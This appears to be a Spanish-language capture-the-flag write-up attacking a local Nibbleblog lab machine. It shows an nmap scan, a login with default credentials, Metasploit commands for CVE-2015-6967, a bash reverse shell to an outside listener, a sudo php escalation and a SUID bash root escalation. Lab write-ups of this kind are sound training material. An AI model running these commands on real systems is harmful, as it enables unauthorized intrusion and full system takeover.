Fecha: 13/08/2024

Empiezo haciendo nmap, encontrando únicamente un servicio Apache en el puerto 80, que no es vulnerable según searchsploit:
```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

Entro a la web y veo el siguiente comentario `<!-- /nibbleblog -->`, por lo que decido entrar en la url http://172.17.0.2/nibbleblog

Un texto dice que para publicar fuera a http://172.17.0.2/nibbleblog/admin.php. Intento hacer #SQLi y, aunque no consigo meterme como admin me sale el siguiente mensaje en la esquina superior izquierda. 

![](Imágenes/Pasted%20image%2020240813161059.png)

![](Imágenes/Pasted%20image%2020240813161147.png)

Pruebo con el usuario y contraseña `admin`, y cuela. 

Investigando, veo que nibbleblog es un CMS para blogs, y buscando en searchsploit veo que hay vulnerabilidades para ciertas versiones: 

![](Imágenes/Pasted%20image%2020240813162331.png)

En la parte de ajustes del dashboard, encuentro que estamos ante una versión vulnerable, por lo que usaré metasploit para explotar la vulnerabilidad: 

![](Imágenes/Pasted%20image%2020240813162405.png)

```
msfconsole -q # para  que no muestre el banner al principio
search nibbleblog
use 0
info 
set user admin
set password admin
set RHOSTS 172.17.0.2
set TARGETURI /nibbleblog

```

![](Imágenes/Pasted%20image%2020240813162746.png)

![](Imágenes/Pasted%20image%2020240813163202.png)

En principio me da un fallo, pero accedendo a la página de información de la vulnerabilidad (https://nvd.nist.gov/vuln/detail/CVE-2015-6967), veo que es porque me falta instalar el plugin myimage. 

Una vez activado de nuevo, tendremos una shell de meterpreter. Con shell crearemos una shell normal. Voy a intentar usar #nc para hacerme una reverse shell más cómoda:
```
# En mi máquina (192.168.1.63):

nc -lnvp 443

# En la shell de meterpreter: 

bash -c "bash -i >&/dev/tcp/192.168.1.63/443 0>&1"

```

Haciendo sudo -l vemos que podemos ejecutar php como si fuera "chocolate". 

![](Imágenes/Pasted%20image%2020240813165936.png)

Buscando en gtfobins, encuentro lo siguiente: https://gtfobins.github.io/gtfobins/php/#sudo

```
CMD="/bin/sh"
sudo -u chocolate php -r "system('$CMD');"
```

![](Imágenes/Pasted%20image%2020240813170315.png)

Haciendo ps -aux, vemos que el root está ejecutando un archivo, que resulta pertenecer a `chocolate`. Por tanto, podemos escribir en él, haciendo por ejemplo que bash tenga el #SUID activado. De esta forma, nos haremos root ejecutando /bin/bash -p 
![](Imágenes/Pasted%20image%2020240813170613.png)

![](Imágenes/Pasted%20image%2020240813170916.png)

```
echo '<?php exec("chmod u+s /bin/bash"); ?>' > /opt/script.php
```
